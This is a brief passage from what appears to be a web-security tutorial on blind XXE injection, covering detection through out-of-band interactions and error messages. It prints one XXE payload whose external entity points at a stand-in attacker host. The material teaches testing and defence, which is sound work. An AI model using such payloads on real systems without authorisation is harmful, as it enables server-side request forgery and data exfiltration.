# What is blind XXE?

Blind XXE vulnerabilities arise where the application is vulnerable to [XXE injection](https://portswigger.net/web-security/xxe) but does not return the values of any defined external entities within its responses. 

There are two broad ways in which you can find and exploit blind XXE vulnerabilities:
1) You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
2) You can trigger XML parsing errors in such a way that the error messages contain sensitive data.

# Detecting blind XXE using out-of-band (OAST) techniques

You can often detect blind XXE using the same technique as for [XXE SSRF attacks](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks) but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:

```bash
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```
This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful
